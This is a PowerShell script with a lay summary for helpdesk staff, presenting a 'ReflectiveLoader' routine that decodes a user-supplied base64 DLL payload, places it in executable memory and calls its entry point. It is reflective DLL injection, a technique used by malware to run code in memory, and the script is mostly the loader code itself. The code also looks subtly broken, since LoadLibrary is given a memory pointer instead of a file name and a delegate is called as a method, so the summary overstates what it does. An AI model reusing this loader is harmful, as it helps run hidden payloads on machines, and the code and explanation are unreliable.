## Calvindd2f
## Below synopsis is in laymans terms... sort of. It's technical but meant to be digestable by helpdesk-staff technical ability.

<#
This code uses a special technique called "ReflectiveLoader" to load a file into a computer's memory and run it. The file is stored as a sequence of numbers in a variable called $payload, and the part of the file that needs to run first is stored in a variable called $dllEntryPoint. The code then uses a special method to load the file into memory and sets up the tools needed to put it into action.

The ReflectiveLoader function is then called, which is the part of the code that does the actual work of loading the file into memory and getting it to run. It does this by first loading the file into memory using a special tool called "LoadLibrary," and then finding the exact place in the file where it needs to start running using another tool called "GetProcAddress."

Next, the code sets up a special place in the computer's memory for the file to run, and copies the file into that space using another tool called "RtlMoveMemory." Finally, it runs the file by calling the part of the file that was set up to run first using the $dllEntryPoint variable.
#>


## DLL payload to be injected (replace with your own payload)
$payload = [System.Convert]::FromBase64String("calvin...")
 
## Define entry point 
$dllEntryPoint = [System.IntPtr]::Zero
 
## Load payload into memory
$memory = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($payload.Length)
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $memory, $payload.Length)
 
## Def signature for the ReflectiveLoader 
$signature = @"
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(byte[] bytes);

[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

[DllImport("kernel32.dll")]
public static extern void RtlMoveMemory(IntPtr destination, IntPtr source, int length);

[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate IntPtr ReflectiveLoader(IntPtr lpData);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
 
## Compile signature
$methods = Add-Type -MemberDefinition $signature -Namespace Win32 -Name Funcs -PassThru
 
## Call ReflectiveLoader to perform the injection
$entryPoint = $methods::LoadLibrary($memory)
$reflectiveLoader = $methods::GetProcAddress($entryPoint, "ReflectiveLoader")
$allocatedMemory = $methods::VirtualAlloc([System.IntPtr]::Zero, $payload.Length, 0x3000, 0x40)
$oldProtection = 0
$methods::VirtualProtect($allocatedMemory, $payload.Length, 0x40, [ref]$oldProtection)
$methods::RtlMoveMemory($allocatedMemory, $memory, $payload.Length)
$methods::ReflectiveLoader($allocatedMemory)
